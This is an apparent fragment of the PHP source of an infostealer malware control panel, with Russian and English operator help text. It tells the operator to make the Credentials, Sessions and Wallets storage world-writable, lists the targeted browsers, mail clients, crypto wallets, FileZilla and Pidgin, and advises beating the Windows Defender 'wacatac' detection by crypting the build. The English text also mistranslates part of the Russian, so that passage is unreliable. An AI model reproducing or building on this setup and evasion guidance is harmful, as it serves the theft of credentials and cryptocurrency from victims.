<?php
   ...
   If ($options["language"] == "Ru")
   {
      ...
      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     ...
                     <div>● Выставьте chmod 777 на каталоги <b>/Screens</b>, <b>/Sessions</b>, <b>/Credentials</b> и 646 на файлы <b>/Cfg/Config.php</b>, <b>/Cfg/Options.php</b>, <b>/Cfg/Wallets.php</b> и <b>/Cfg/Sync.php</b></div></td>
                  </tr>
               </table>";
      ...
      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Chrome based, Firefox based, Microsoft Outlook, Mozilla Thunderbird, Tor Browser, Atomic, Exodus, Electrum, Armory, DogeCoin, LiteCoin, Monero, FileZilla, Pidgin...</td>
                  </tr>
               </table>";
      ...
      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.5</b> Что такое wacatac!** детект от Windows Defender?</td>
                  </tr>
               </table>";
      ...
      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>wacatac!** это детект низкорепутационного файла с zone=3, скачанного на Х компьютеров с небольшого подмножества сайтов Z. Убирается криптом.</td>
                  </tr>
               </table>";
   ...
   If ($options["language"] == "En")
   {
      ...
      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     ...
                     <div>● Set chmod 777 on catalogs <b>/Screens</b>, <b>/Sessions</b>, <b>/Credentials</b> and 646 to files <b>/Cfg/Config.php</b>, <b>/Cfg/Options.php</b>, <b>/Cfg/Wallets.php</b> and <b>/Cfg/Sync.php</b></div></td>
                  </tr>
               </table>";
      ...
      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.5</b> What is wacatac!** Windows Defender detect?</td>
                  </tr>
               </table>";
      ...
      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>wacatac!** is a low-latency file detector with zone=3 downloaded to X computers from a small subset of Z sites. Can be fixed by crypt.</td>
                  </tr>
               </table>";
